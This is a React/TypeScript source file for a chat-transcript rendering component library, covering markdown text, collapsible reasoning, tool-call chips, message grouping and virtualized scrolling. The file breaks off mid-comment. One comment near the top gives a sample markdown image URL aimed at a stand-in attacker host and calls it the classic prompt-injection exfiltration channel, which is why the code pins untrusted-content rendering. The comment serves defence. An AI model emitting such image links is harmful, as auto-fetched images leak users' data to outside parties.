/**
 * thread-message — Mantine-styled AgentPart renderers plus a role-labelled transcript renderer.
 *
 * `threadPartRenderers` overrides the headless `PartList` defaults from `../agent` with Mantine
 * chrome: markdown text, a dimmed collapsible for reasoning ("Thinking"), a rail-styled tool-call
 * block, a source Anchor, and a red error Alert. `ThreadTranscript` composes those renderers over
 * a thread's settled messages plus an optional live (in-flight) assistant turn.
 *
 * This module is Mantine-coupled by design — it lives in `agent-chat/`, the root surface where
 * Mantine is allowed (unlike the Mantine-free `agent/` headless layer it renders on top of).
 *
 * @example
 * import { ThreadTranscript } from 'basalt-ui'
 *
 * <ThreadTranscript
 *   messages={thread.messages}
 *   liveParts={liveParts}
 *   liveStatus={runStatus}
 * />
 */
import {
  Alert,
  Anchor,
  Box,
  Collapse,
  Group,
  Loader,
  Stack,
  Text,
  UnstyledButton,
} from '@mantine/core'
import { useDisclosure, useFocusWithin, useHover, useMergedRef } from '@mantine/hooks'
import { Fragment, lazy, memo, Suspense, useLayoutEffect, useMemo, useRef } from 'react'
import type { JSX } from 'react'
import type {
  AgentPart,
  AgentPartRenderers,
  ChatMessage,
  ErrorPart,
  ForeignPart,
  PartRenderer,
  PartRenderers,
  ReasoningPart,
  SourcePart,
  StreamStatus,
  TextPart,
  ToolCallPart,
  TranscriptPart,
} from '../agent'
import { coalesceParts, narrowAgentPart, PartList } from '../agent'
import { Markdown } from '../content/markdown'
import { CopyAction } from '../content/copy-action'
import { VX } from '../tokens'
import { DEFAULT_AFFORDANCES } from './message-affordances'
import type { MessageAffordances } from './message-affordances'
import { formatRelativeTime } from './relative-time'
import { ToolChip } from './tool-chip'
import { resolveVirtualize } from './virtualize'
import type { VirtualizeOptions, VirtualizeProps } from './virtualize'
import { isDev } from '../utils/is-dev'

/** The mono, uppercase, letter-spaced micro-label idiom (docs/DESIGN-SPEC.md §3) — shared by the
 * transcript's role labels and the reasoning/tool-call headers below. */
const MICRO_LABEL_STYLE = {
  fontFamily: 'var(--basalt-font-mono)',
  fontSize: VX.text.micro,
  fontWeight: 500,
  letterSpacing: '0.06em',
  textTransform: 'uppercase',
  color: VX.faint,
} as const

// ── Per-type Mantine renderers ────────────────────────────────────────────────

function TextRenderer({
  part,
  settled,
}: {
  part: TextPart
  index: number
  settled: boolean
}): JSX.Element {
  // Markdown wraps its output in Prose (a div carrying chat-density typography). It must NOT be
  // wrapped in a Mantine `Text` (renders a `<p>`) — block elements inside a `<p>` are invalid
  // nesting that the browser auto-closes, scrambling spacing.
  //
  // TWO independent props, and conflating them is what broke this twice:
  //
  // `streaming={!settled}` is the RENDERING mode — NOT a hardcoded `streaming`. Hardcoding it kept
  // `Markdown` in block-split mode forever, and its tail block is unconditionally unsettled: a
  // FINISHED message ending in a ```mermaid fence rendered as a CodeBlock permanently, and the last
  // block of every finished message permanently hid its copy action.
  //
  // `contentTrust="untrusted"` is the SECURITY policy, and it is pinned unconditionally. Transcript
  // text is model-generated whether or not the run is still in flight, and images auto-fetch —
  // `![](https://attacker/?q=…)` is the classic prompt-injection exfiltration channel. Letting
  // `streaming` imply the policy meant every SETTLED (i.e. almost every) message silently regained
  // an open `https://` image allowlist the moment the run finished.
  return (
    <Markdown streaming={!settled} contentTrust="untrusted" density="chat">
      {part.text}
    </Markdown>
  )
}

// Tool-call/reasoning parts (docs/DESIGN-SPEC.md §5): a mono micro-label header with a faint left
// divider rail — quieter than the card idiom, since these are transcript asides, not surfaces.
const RAIL_STYLE = {
  borderLeft: `2px solid ${VX.divider}`,
  paddingLeft: 'var(--vx-space-agent-rail-inset-x)',
} as const

/** A dimmed, collapsed-by-default disclosure for reasoning/thinking fragments. */
function ReasoningRenderer({ part }: { part: ReasoningPart; index: number }): JSX.Element {
  const [open, { toggle }] = useDisclosure(false)
  return (
    <Box style={RAIL_STYLE}>
      <Stack gap={4}>
        <UnstyledButton onClick={toggle}>
          <Text style={MICRO_LABEL_STYLE}>{open ? 'Hide thinking' : 'Thinking'}</Text>
        </UnstyledButton>
        <Collapse expanded={open}>
          <Text size="xs" c="dimmed" style={{ whiteSpace: 'pre-wrap' }}>
            {part.text}
          </Text>
        </Collapse>
      </Stack>
    </Box>
  )
}

// Thin adapter: PartList's per-type renderer signature is `{ part, index, settled }`, ToolChip's is a
// richer `ToolChipProps` (defaultExpanded/onApprove/onDeny) that the built-in AgentPart union has
// no slot for — a 'tool' part reaching this path is always basalt's own six-variant union, never a
// consumer-registered one, so there is nowhere upstream to source approve/deny handlers from at
// this call site. A consumer that needs approve/deny wiring renders `ToolChip` directly instead of
// going through `PartList`/`threadPartRenderers`.
function ToolChipRenderer({ part }: { part: ToolCallPart; index: number }): JSX.Element {
  return <ToolChip part={part} />
}

function SourceRenderer({ part }: { part: SourcePart; index: number }): JSX.Element {
  return (
    <Anchor href={part.url} target="_blank" rel="noopener noreferrer" size="sm">
      {part.title ?? part.url}
    </Anchor>
  )
}

function ErrorRenderer({ part }: { part: ErrorPart; index: number }): JSX.Element {
  return (
    <Alert color="red" variant="light" radius="sm" p="xs">
      {part.message}
    </Alert>
  )
}

/**
 * Mantine overrides for `PartList`'s default headless renderers — the house style for rendering
 * an `AgentPart` inside a chat surface.
 *
 * @example
 * import { PartList } from 'basalt-ui/agent'
 * import { threadPartRenderers } from 'basalt-ui'
 * <PartList parts={parts} components={threadPartRenderers} />
 */
export const threadPartRenderers: Partial<AgentPartRenderers> = {
  text: TextRenderer,
  reasoning: ReasoningRenderer,
  tool: ToolChipRenderer,
  source: SourceRenderer,
  error: ErrorRenderer,
}

// ── UnknownPartChip — the dev-visible default fallback ────────────────────────

/** A visible marker for a part `ThreadTranscript` could not resolve — neither a registered
 * consumer renderer nor a built-in `AgentPart` variant claimed it. Dev-only by default (see
 * `DEFAULT_FALLBACK_RENDERER` below): a server emitting a new part type must not blank the
 * transcript, but it also shouldn't silently vanish while the app is being built against it. */
function UnknownPartChip({ part }: { part: ForeignPart }): JSX.Element {
  return (
    <Box style={RAIL_STYLE}>
      <Text style={MICRO_LABEL_STYLE}>{`Unknown part: ${part.type}`}</Text>
    </Box>
  )
}

/** Consulted only when `ThreadTranscript` gets no `fallbackRenderer` prop. `isDev()` reads
 * `process.env.NODE_ENV` (not `import.meta.env` — basalt-ui bans it) INSIDE the render so tests can
 * flip it. */
const DEFAULT_FALLBACK_RENDERER: PartRenderer<ForeignPart> = ({ part }) =>
  isDev() ? <UnknownPartChip part={part} /> : null

// ── Part resolution — the three-step order that is the whole design ───────────
//
// 1. `renderers[part.type]` — a registered consumer renderer, if present. Consumer wins, always.
// 2. `narrowAgentPart(part)` non-null — one of basalt's own six variants, routed to `PartList`'s
//    UNCHANGED, closed-union, exhaustive switch (`part-list.tsx:291-293`).
// 3. `fallbackRenderer` — anything left over. Never throws.
//
// `PartList` keeps its own `AgentPartRenderers` map and `assertNever` gate untouched — two
// registries, two jobs: `PartList` renders what basalt knows, exhaustively; `ThreadTranscript`
// renders what the app knows, openly. A `TPart` generic threaded through `AgentThread` →
// `ThreadsStore` → `useAgentThreadRuns` → every component would be the alternative, and it's the
// exact ripple `thread.ts:79-93` already cites as the reason `meta` stayed untyped.

type ResolvedSegment =
  | { readonly kind: 'agent'; readonly key: string; readonly parts: AgentPart[] }
  | {
      readonly kind: 'foreign'
      readonly key: string
      readonly part: ForeignPart
      readonly render: PartRenderer<ForeignPart>
    }

/**
 * Splits a message's parts into ordered, render-ready segments per the resolution order above.
 * Consecutive built-in-resolved parts are batched into one 'agent' segment — coalesced, then
 * handed to `PartList` as a unit — so the existing adjacent-merge behaviour (text+text, tool-by-id
 * regardless of adjacency) survives a foreign part interleaving the stream. A foreign-resolved
 * part always stands alone; there is nothing in the closed union for it to merge with.
 */
function resolveSegments(
  parts: readonly TranscriptPart[],
  renderers: PartRenderers,
  fallbackRenderer: PartRenderer<ForeignPart>,
): ResolvedSegment[] {
  const segments: ResolvedSegment[] = []
  let buffer: AgentPart[] = []

  const flushBuffer = (): void => {
    const first = buffer[0]
    if (first === undefined) return
    segments.push({ kind: 'agent', key: first.id, parts: coalesceParts(buffer) })
    buffer = []
  }

  for (const part of parts) {
    // `PartRenderers` resolves to `Record<string, PartRenderer<ForeignPart>>` in basalt-ui's own
    // (un-augmented) compilation — a plain runtime string-keyed lookup, `noUncheckedIndexedAccess`
    // giving the `| undefined` this relies on.
    const consumerRenderer = renderers[part.type]
    if (consumerRenderer !== undefined) {
      flushBuffer()
      // Not narrowed to ForeignPart by the `renderers[part.type]` lookup above — asserted, not
      // proven, by the registry contract (a registered key belongs to the consumer's foreign-part
      // union).
      segments.push({
        kind: 'foreign',
        key: part.id,
        part: part as ForeignPart,
        render: consumerRenderer,
      })
      continue
    }

    const agentPart = narrowAgentPart(part)
    if (agentPart !== null) {
      buffer.push(agentPart)
      continue
    }

    flushBuffer()
    segments.push({
      kind: 'foreign',
      key: part.id,
      part: part as ForeignPart,
      render: fallbackRenderer,
    })
  }

  flushBuffer()
  return segments
}

/** Concatenates every resolved `text` part across a message's segments, in order, joined by a
 * blank line between non-adjacent runs (adjacent text parts are already merged by `coalesceParts`
 * inside `resolveSegments`). This is what the per-message copy affordance copies — the message's
 * COALESCED text, not its raw `parts`, so a message that streamed in several by-id text chunks
 * copies one clean string rather than the fragments the user never saw assembled. Foreign
 * (consumer-registered) segments carry no `AgentPart`-typed text and are skipped. */
function extractCoalescedText(segments: readonly ResolvedSegment[]): string {
  const chunks: string[] = []
  for (const segment of segments) {
    if (segment.kind !== 'agent') continue
    for (const part of segment.parts) {
      if (part.type === 'text') chunks.push(part.text)
    }
  }
  return chunks.join('\n\n')
}

// ── MessageAffordanceRow — the per-message hover row (AGENT-CHAT-SPEC.md §11) ─────────────────

const GROUP_WINDOW_MS = 5 * 60_000

/** True when `message` continues the SAME speaker's immediately-preceding turn within the Slack
 * grouping window — the predecessor is absent (first message), a different role, or more than
 * `GROUP_WINDOW_MS` apart all resolve to false. */
function isConsecutiveWithPredecessor(
  message: ChatMessage<TranscriptPart>,
  predecessor: ChatMessage<TranscriptPart> | undefined,
): boolean {
  if (predecessor === undefined) return false
  if (predecessor.role !== message.role) return false
  return message.createdAt - predecessor.createdAt <= GROUP_WINDOW_MS
}

type MessageAffordanceRowProps = {
  readonly message: ChatMessage<TranscriptPart>
  readonly coalescedText: string
  readonly affordances: MessageAffordances
  readonly isLastAssistant: boolean
  /** Driven by the parent block's hover state OR its focus-within state — a visual reveal-on-hover
   * strip that must ALSO reveal for a sighted keyboard-only user tabbing a control into view (hover
   * alone left a focused Copy/Regenerate control invisible, with no focus ring visible either). The
   * row stays mounted (and clickable/focusable) at all times rather than being removed from the
   * DOM — that part of "keyboard/AT users never lose the controls a mouse user gets for free" held
   * even before this fix for screen-reader users (opacity keeps elements in the a11y tree); visible
   * focus for SIGHTED keyboard users is the half that did not, until this `focused` term was added. */
  readonly visible: boolean
}

/** The per-message hover row: relative/absolute/none timestamp, a copy-coalesced-text action, a
 * regenerate action (last assistant message only), and any consumer `actions`. Renders `null` when
 * every affordance resolves to off (nothing to show, no empty strip taking up rhythm). */
function MessageAffordanceRow({
  message,
  coalescedText,
  affordances,
  isLastAssistant,
  visible,
}: MessageAffordanceRowProps): JSX.Element | null {
  const timestampMode = affordances.timestamp ?? DEFAULT_AFFORDANCES.timestamp
  const showTimestamp = timestampMode !== 'none'
  const showCopy = affordances.copy ?? DEFAULT_AFFORDANCES.copy
  const showRegenerate = isLastAssistant && affordances.onRegenerate !== undefined
  const customActions = affordances.actions?.({ message })

  if (!showTimestamp && !showCopy && !showRegenerate && customActions === undefined) return null

  const timestampLabel =
    timestampMode === 'absolute'
      ? new Date(message.createdAt).toLocaleString()
      : formatRelativeTime(message.createdAt)

  return (
    <Group
      gap={8}
      data-testid={`message-affordances-${message.id}`}
      style={{ opacity: visible ? 1 : 0, transition: 'opacity 120ms ease' }}
    >
      {showTimestamp && (
        <Text size="xs" c="dimmed">
          {timestampLabel}
        </Text>
      )}
      {showCopy && <CopyAction value={coalescedText} ariaLabel="Copy message" />}
      {showRegenerate && (
        <UnstyledButton onClick={() => affordances.onRegenerate?.(message.id)}>
          <Text style={MICRO_LABEL_STYLE}>Regenerate</Text>
        </UnstyledButton>
      )}
      {customActions}
    </Group>
  )
}

// ── MessageBlock (memoized) ────────────────────────────────────────────────────

const ROLE_LABEL: Record<ChatMessage['role'], string> = {
  user: 'You',
  assistant: 'Assistant',
}

// Terminal-state indicator (docs/AGENT-CHAT-SPEC.md §10) — `message.finish` is optional (absent on
// every user message and on pre-1.11 persisted assistant messages) and carries the distinction
// `ThreadStatus` deliberately does not: a stopped turn's thread status is `'done'`, same as a
// completed one. `'complete'` is the unremarkable case and has no entry here, so a lookup miss
// renders nothing — no badge on every ordinary message. Only 'stopped'/'error' earn a mark, in the
// same mono micro-label register as ROLE_LABEL, not a new decorative element.
const FINISH_INDICATOR: Partial<
  Record<
    NonNullable<ChatMessage['finish']>,
    { readonly label: string; readonly statusToken: string }
  >
> = {
  stopped: { label: 'Stopped', statusToken: VX.status.warn },
  error: { label: 'Error', statusToken: VX.status.bad },
}

type MessageBlockProps = {
  readonly message: ChatMessage<TranscriptPart>
  readonly streaming?: boolean
  readonly renderers: PartRenderers
  readonly fallbackRenderer: PartRenderer<ForeignPart>
  /** Suppresses the role label and surface chrome — this message continues the same speaker's
   * immediately-preceding turn within the grouping window (the Slack rhythm, AGENT-CHAT-SPEC.md
   * §_). Computed by `ThreadTranscript` (a property of the SEQUENCE, not of one message in
   * isolation) and passed down. @default false */
  readonly grouped?: boolean
  /** Per-message hover-row affordances. `undefined` renders NO affordance row at all — this is how
   * `ThreadTranscript` opts the live/streaming message out (an epoch-0 `createdAt` and a
   * half-streamed coalesced text would otherwise render a nonsensical "56 years ago" timestamp and
   * a copy button that copies a fragment). Every settled message gets a resolved (defaults-merged)
   * object instead. */
  readonly affordances?: MessageAffordances
  /** True only for the single most-recent SETTLED assistant message — the sole message
   * `affordances.onRegenerate` renders a control for. @default false */
  readonly isLastAssistant?: boolean
}

/**
 * Render-execution counter for `MessageBlockImpl` — increments only when React actually calls the
 * function body (a `memo` bail-out never reaches it). NOT part of the public surface —
 * `agent-chat/index.ts` does not re-export it. The memoization test imports this module directly
 * (bypassing the barrel) to prove the memo boundary in a controlled render-count harness.
 */
export const messageBlockRenderCounter = { count: 0 }

function MessageBlockImpl({
  message,
  streaming = false,
  renderers,
  fallbackRenderer,
  grouped = false,
  affordances,
  isLastAssistant = false,
}: MessageBlockProps): JSX.Element {
  messageBlockRenderCounter.count += 1
  const settled = !streaming
  const { hovered, ref: hoverRef } = useHover<HTMLDivElement>()
  // `focused` covers the sighted-keyboard-user gap hover alone leaves open (see
  // `MessageAffordanceRowProps.visible`'s doc) — merged onto the SAME node as `hoverRef` via
  // `useMergedRef` since both hooks need their own callback ref on this one element.
  const { focused, ref: focusWithinRef } = useFocusWithin<HTMLDivElement>()
  const ref = useMergedRef(hoverRef, focusWithinRef)
  const segments = useMemo(
    () => resolveSegments(message.parts, renderers, fallbackRenderer),
    [message.parts, renderers, fallbackRenderer],
  )
  const finishIndicator =
    message.finish === undefined ? undefined : FINISH_INDICATOR[message.finish]
  // Guarded on `affordances`: the live/streaming message is pushed into `rows` WITHOUT this prop
  // (see `MessageBlockProps.affordances`'s doc), so `MessageAffordanceRow` never renders for it —
  // computing `extractCoalescedText` for it anyway would be pure waste, and `segments` for a live
  // message grows every streamed chunk, so unconditionally recomputing it scaled total work across
  // one streamed reply with the SQUARE of the response length.
  const coalescedText = useMemo(
    () => (affordances === undefined ? '' : extractCoalescedText(segments)),
    [affordances, segments],
  )

  // Grouped continuations drop the role label — but a streaming loader or a finish badge is
  // per-message state (not sequence rhythm) and must still surface even mid-group, so the header
  // row itself only disappears when there is truly nothing left for it to show.
  const showHeader = !grouped || streaming || finishIndicator !== undefined

  // Assistant/user surfaces are differentiated by subtle vs panel tokens, radius 7
  // (VX.radiusCard, docs/DESIGN-SPEC.md §5) — the user's own turn sits a shade quieter than the
  // reply. A grouped continuation drops this chrome entirely (transparent, no shadow, no radius)
  // — that absence, alongside the suppressed role label, IS the Slack rhythm.
  return (
    <Box
      ref={ref}
      data-testid={`agent-message-${message.id}`}
      data-grouped={grouped}
      style={{
        padding: 'var(--vx-space-agent-message-inset-y) var(--vx-space-agent-message-inset-x)',
        ...(grouped
          ? {}
          : {
              backgroundColor: message.role === 'user' ? VX.surface.subtle : VX.surface.panel,
              borderRadius: VX.radiusCard,
              boxShadow: VX.shadowCard,
            }),
      }}
    >
      <Stack gap={6}>
        {showHeader && (
          <Group gap={6} align="center">
            {!grouped && <Text style={MICRO_LABEL_STYLE}>{ROLE_LABEL[message.role]}</Text>}
            {streaming && <Loader size="xs" />}
            {finishIndicator !== undefined && (
              <Text style={{ ...MICRO_LABEL_STYLE, color: finishIndicator.statusToken }}>
                {finishIndicator.label}
              </Text>
            )}
          </Group>
        )}
        {segments.map((segment) =>
          segment.kind === 'agent' ? (
            <PartList
              key={segment.key}
              parts={segment.parts}
              components={threadPartRenderers}
              settled={settled}
            />
          ) : (
            <Fragment key={segment.key}>
              {segment.render({
                part: segment.part,
                messageId: message.id,
                partId: segment.part.id,
                settled,
                role: message.role,
              })}
            </Fragment>
          ),
        )}
        {affordances !== undefined && (
          <MessageAffordanceRow
            message={message}
            coalescedText={coalescedText}
            affordances={affordances}
            isLastAssistant={isLastAssistant}
            visible={hovered || focused}
          />
        )}
      </Stack>
    </Box>
  )
}

/** Compares `message` BY REFERENCE plus the `streaming` flag — the props a per-token streaming
 * re-render must not force through every settled message's `MessageBlock`. `renderers`/
 * `fallbackRenderer` are included too: both are memoized once at the `ThreadTranscript` level (see
 * below), so in practice they're stable across renders, but a genuine change to either (a consumer
 * swapping its renderer map) must still invalidate the memo. `grouped` and `isLastAssistant` are
 * cheap booleans recomputed every `ThreadTranscript` render — including them keeps a message from
 * rendering yesterday's grouping/regenerate-eligibility when a NEIGHBOUR changes, at negligible
 * comparator cost. `affordances` is a single object `ThreadTranscript` re-resolves only when its
 * OWN fields change (see `resolvedAffordances` below) — comparing it by reference here is what lets
 * a consumer's fresh-object-literal `affordances` prop NOT force every block to re-render. */
function areMessageBlockPropsEqual(prev: MessageBlockProps, next: MessageBlockProps): boolean {
  return (
    prev.message === next.message &&
    prev.streaming === next.streaming &&
    prev.renderers === next.renderers &&
    prev.fallbackRenderer === next.fallbackRenderer &&
    prev.grouped === next.grouped &&
    prev.affordances === next.affordances &&
    prev.isLastAssistant === next.isLastAssistant
  )
}

const MessageBlock = memo(MessageBlockImpl, areMessageBlockPropsEqual)

// ── Virtualization (AGENT-CHAT-SPEC.md §9) ─────────────────────────────────────
//
// `@tanstack/react-virtual` is an OPTIONAL peer (see `./virtualize`'s module doc). `agent-chat` is
// ONE package.json export subpath — unlike `basalt-ui/data/virtual`, which gets to statically
// import the peer because it lives behind its OWN subpath (a consumer who never imports it never
// resolves the peer either) — so a static top-level import here would make every `ThreadTranscript`
// consumer require the peer, even ones that never pass `virtualize`. Lazy + dynamic `import()` +
// `.catch()` degrade, mirroring `../agent/stick-to-bottom.tsx`'s established pattern exactly, keeps
// the non-virtualized path working with the package absent.

/** Default extra rows rendered beyond the viewport, each side. Higher than
 * `BasaltVirtualList`'s generic-list default (5) — a streaming transcript's scroll bursts benefit
 * from more pre-rendered neighbours above/below the fold. */
const DEFAULT_VIRTUALIZE_OVERSCAN = 6

/** Default estimated row height in px, used before a row has been measured. Chat rows run taller
 * than a generic list row (role header + multi-line prose), hence higher than
 * `BasaltVirtualList`'s default of 40. Measured mean row height on the shipped 500-message demo
 * thread is ~145px (total size climbed 49,486 → 72,448px over one descent, ~934px/screenful) — an
 * estimate below the mean shrinks the scrollbar thumb continuously for the whole first scroll
 * down. TanStack's own guidance for dynamically measured lists is to estimate toward the LARGER
 * end: overestimating settles the thumb downward once real measurements land, instead of
 * shrinking it. 160 rounds up from the measured mean with headroom for the estimate to still be
 * defensible on a shorter/plainer demo thread. */
const DEFAULT_VIRTUALIZE_ESTIMATE_SIZE = 160

/** Default `scrollEndThreshold` — how close (px) to the end still counts as "at the end" for
 * `followOnAppend`/`anchorTo: 'end'` to keep tracking rather than freezing the scroll position. */
const DEFAULT_VIRTUALIZE_SCROLL_END_THRESHOLD = 64

/** Default `VirtualizeOptions.initialScroll` — see `./virtualize`'s fourth composition rule for
 * why a chat transcript opens at the newest message rather than the oldest. */
const DEFAULT_VIRTUALIZE_INITIAL_SCROLL: NonNullable<VirtualizeOptions['initialScroll']> = 'end'

/** Caps `applyInitialScroll`'s clobber-recovery retries (see `./virtualize`'s fourth composition
 * rule for the full mechanism this guards). A small fixed budget, not a time/frame-based deadline:
 * every observed case of virtual-core's `_willUpdate` clobbering this effect's jump resolves within
 * one extra commit, so this exists purely as a backstop against a pathological DOM that never
 * reports settled — not as the expected path. Once exhausted, the effect gives up and marks the
 * jump permanently done wherever the last attempt landed, rather than fighting the DOM (or a user
 * who has since scrolled away) forever. Exported (like `messageBlockRenderCounter`) purely so its
 * test can assert the exact bound without duplicating the number; not part of the public surface. */
export const MAX_INITIAL_SCROLL_ATTEMPTS = 5

type TranscriptRow = {
  readonly key: string
  readonly node: JSX.Element
}

type VirtualizedTranscriptProps = {
  readonly rows: readonly TranscriptRow[]
  readonly height: number | string
  readonly overscan: number
  readonly estimateSize: number
  readonly initialScroll: NonNullable<VirtualizeOptions['initialScroll']>
}

/**
 * The degrade target: every row rendered unwindowed inside a fixed-height scroll container.
 * This is what a `virtualize: true` transcript falls back to when `@tanstack/react-virtual` fails
 * to resolve (peer absent) — same visual shape (a scrollable `height`-bound pane), just without
 * windowing.
 *
 * NOT used as the `Suspense` fallback (see `VirtualizeSuspenseFallback` below) — mounting every
 * real `MessageBlock` subtree for the one tick the lazy import takes to settle would make that
 * settle a genuine unmount/remount of every rendered row, re-firing each row's effects once and
 * risking hitting a message mid-stream during the resolve window.
 */
function NonVirtualizedRows({ rows, height }: VirtualizedTranscriptProps): JSX.Element {
  return (
    // theme-allow raw-scroll-container — degrade target owns its own scroll node, same as the real virtualizer below.
    <Box style={{ height, overflow: 'auto' }}>
      <Stack gap="sm">
        {rows.map((row) => (
          <Fragment key={row.key}>{row.node}</Fragment>
        ))}
      </Stack>
    </Box>
  )
}

/** Test-only escape hatch (mirrors `messageBlockRenderCounter` above) — proves the peer-absent
 * degrade target itself renders every row without windowing and without throwing, without having
 * to fight `React.lazy`'s permanent once-per-module-instance resolution cache to simulate the
 * peer's absence at the `import()` layer (see thread-message.test.tsx's virtualization describe
 * block for why that approach was rejected). Not exported from `agent-chat/index.ts`. */
export const nonVirtualizedRowsFallback = NonVirtualizedRows

/**
 * Minimal structural slice of `Virtualizer` (virtual-core 3.17.1) that
 * {@link resolveGuardedMeasurement} needs — `indexFromElement`/`itemSizeCache`/`options` are all
 * public instance members, but typing against the real (generic, peer-only) `Virtualizer` class
 * would force this test-only-exported helper to import the peer's runtime types at module scope,
 * the exact static-import-forces-the-peer problem the surrounding `lazy(() => import(...))` exists
 * to avoid. A structural type sidesteps that without loosening to `any`. Generic over the item
 * element type (rather than fixed at `Element`) so it stays exactly assignable FROM a real
 * `Virtualizer<TScrollElement, TItemElement>` at the call site below — `indexFromElement` is
 * declared with arrow-property (not method) syntax upstream, so it is checked contravariantly, and
 * a fixed `Element` parameter there does not structurally match a real instance's narrower
 * `TItemElement` parameter.
 */
type MeasurementCacheHost<TItemElement extends Element> = {
  readonly indexFromElement: (node: TItemElement) => number
  readonly itemSizeCache: Map<unknown, number>
  readonly options: {
    readonly getItemKey: (index: number) => unknown
    readonly estimateSize: (index: number) => number
  }
}

/**
 * Resolves the size a `measureElement` implementation should report, given what the underlying
 * (default or custom) measurement already produced: that value unchanged when it is a genuine
 * measurement, or the row's own last-known size when it is `0` — never a real reading for a mounted
 * row, so a `0` only ever means the ResizeObserver measured through a `display: none` (or otherwise
 * unlaid-out) ancestor, e.g. a virtualized transcript sitting inside a collapsed `ThreadFeedRow`.
 * Falling through to it unguarded is what corrupted `itemSizeCache`/`measurementsCache`: virtual-
 * core's default `resizeItem` writes whatever `measureElement` returns with no floor, so every
 * mounted row remeasures at 0px the instant an ancestor hides, `getTotalSize()` collapses within
 * the same tick, and the collapse is never undone — a later real remeasurement only OVERWRITES
 * entries the ResizeObserver happens to re-fire for, it does not restore ones that silently kept
 * their poisoned 0 (see `virtualize.ts`'s composition-rule doc for the full mechanism and the
 * measured numbers).
 *
 * Takes the already-computed `size` plus the {@link MeasurementCacheHost} slice, rather than
 * wrapping the `measureElement` function itself, so this stays a plain, non-generic-over-a-
 * generic-function call at its one call site below (`instance` there is `Virtualizer<TScrollElement,
 * TItemElement>` for THAT call's concrete type arguments, not the peer's own generic
 * `measureElement` export — wrapping the latter directly hits TS's higher-rank inference limits on
 * a doubly-generic HOF). That shape is also what makes this unit-testable with a fake host object
 * and no ResizeObserver/layout engine at all (happy-dom has neither). Not exported from
 * `agent-chat/index.ts`: a test-only escape hatch, matching
 * `messageBlockRenderCounter`/`nonVirtualizedRowsFallback` above.
 */
export function resolveGuardedMeasurement<TItemElement extends Element>(
  host: MeasurementCacheHost<TItemElement>,
  element: TItemElement,
  size: number,
): number {
  if (size > 0) return size
  // Same key derivation `resizeItem` itself uses (index → getItemKey), read BEFORE `resizeItem`
  // writes the new (bad) size — `itemSizeCache` still holds the last-good measurement here.
  const index = host.indexFromElement(element)
  const key = host.options.getItemKey(index)
  return host.itemSizeCache.get(key) ?? host.options.estimateSize(index)
}

/**
 * Decides what `VirtualizedRowsInner`'s one-shot initial-scroll effect should do this render,
 * given the inputs the effect closes over. Pure and peer/DOM-free — pulled out of the lazy-loaded
 * closure for the same reason `resolveGuardedMeasurement` is: it stays unit-testable without a
 * real `Virtualizer` instance or `@tanstack/react-virtual` itself.
 *
 * `'start'` and an empty transcript resolve to `'skip-done'` — there is nothing to scroll to, and
 * DONE is permanent (see `virtualize.ts`'s fourth composition rule: the real scroll must fire at
 * most once, ever, so a later append never yanks a user who has scrolled up). A non-positive
 * `containerHeight` — the transcript's own scroll node measuring `0`, e.g. mounted behind a
 * `display: none` ancestor per `virtualize.ts`'s third composition rule — resolves to
 * `'skip-retry'`: NOT done, so the caller's effect (which re-runs after EVERY commit until the jump
 * lands — see {@link applyInitialScroll}) gets another chance the next time this subtree renders,
 * instead of permanently stranding the transcript at the top the moment it becomes visible. Only a
 * genuinely measured, non-empty, `'end'`-targeted mount resolves to `'scroll'`.
 */
export function resolveInitialScrollAction(
  initialScroll: NonNullable<VirtualizeOptions['initialScroll']>,
  rowCount: number,
  containerHeight: number,
): 'scroll' | 'skip-done' | 'skip-retry' {
  if (initialScroll === 'start') return 'skip-done'
  if (rowCount === 0) return 'skip-done'
  if (containerHeight <= 0) return 'skip-retry'
  return 'scroll'
}

/** The mutable half of the one-shot initial-scroll contract. `hasApplied` is whether it has
 * PERMANENTLY finished — either there was nothing to do (`'start'`/empty transcript), or
 * `scrollToEnd` fired and was subsequently CONFIRMED (via a real DOM read — see
 * {@link applyInitialScroll}'s doc for why virtual-core's own tracked offset can't be trusted for
 * this) to have survived whatever else committed since. `attempts` counts how many times
 * `scrollToEnd` has been (re-)fired this mount; 0 means never attempted, and also gates whether a
 * call re-derives {@link resolveInitialScrollAction} at all. One instance lives for the lifetime of
 * a `VirtualizedRowsInner` mount, held in a `useRef` so it survives re-renders without itself
 * triggering one. */
export type InitialScrollState = { hasApplied: boolean; attempts: number }

/**
 * The stateful half of "fires once, on first mount, and never again" (`virtualize.ts`'s fourth
 * composition rule): wraps {@link resolveInitialScrollAction}'s per-call decision with the
 * ACROSS-CALLS memory that decision alone can't carry. Exported (like `resolveGuardedMeasurement`)
 * so `VirtualizedRowsInner`'s effect below calls this SAME function rather than a hand-mirrored
 * copy for tests — a fake `scrollToEnd` is the only DOM/peer-free way to prove the guard, since a
 * real `Virtualizer`'s own `followOnAppend` also calls the real DOM `scrollTo` on a later append,
 * making that specific call indistinguishable from this one at the DOM boundary (see this
 * function's test suite for the measurement that ruled that boundary out).
 *
 * Firing `scrollToEnd()` once is NOT the same as landing there: virtual-core 3.17.1's own
 * `_willUpdate` (verified against the installed dist) writes to the SAME scroll container from
 * `this.scrollOffset`, which updates only from the ASYNCHRONOUS native `scroll` event — never from
 * the synchronous call that requested a scroll. A commit that runs `_willUpdate` before this
 * effect gets a turn (element-attach) or that re-derives an anchor while `scrollOffset` still holds
 * the pre-jump value writes that STALE offset straight back to `scrollTop`, undoing the jump within
 * about one extra commit of it landing (see `./virtualize`'s fourth composition rule for the full
 * trace this was diagnosed from). So `resolveInitialScrollAction`'s `'scroll'` outcome does not, by
 * itself, set `hasApplied`: `isAtEnd` — a real `scrollTop`/`scrollHeight`/`clientHeight` read, the
 * one piece of ground truth that is NEVER stale, unlike virtual-core's own tracked offset — is
 * consulted on the NEXT call (i.e. the next commit, exactly the cadence this dependency-free effect
 * already runs on) to confirm the jump survived. If it didn't, `scrollToEnd` fires again; if it did,
 * `hasApplied` is set and the effect is inert for the rest of the mount. `MAX_INITIAL_SCROLL_ATTEMPTS`
 * bounds this so a DOM that pathologically never reports settled — or a user who scrolls away mid-
 * measurement — can never be fought forever; once exhausted, `hasApplied` is set regardless, wherever
 * the last attempt left the container.
 *
 * `state.hasApplied` is the ONLY thing that can permanently stop this from calling `scrollToEnd`
 * again: `'start'` and an empty transcript set it immediately (nothing to verify), and `'skip-retry'`
 * deliberately leaves it `false` so a transcript that mounted behind a hidden ancestor gets another
 * attempt on the caller's next commit, rather than being silently abandoned the moment it becomes
 * visible. That retry — and the clobber-recovery above — is why the caller's effect carries NO
 * dependency array: the commit that matters (a collapsed `ThreadFeedRow` flipping its body back to
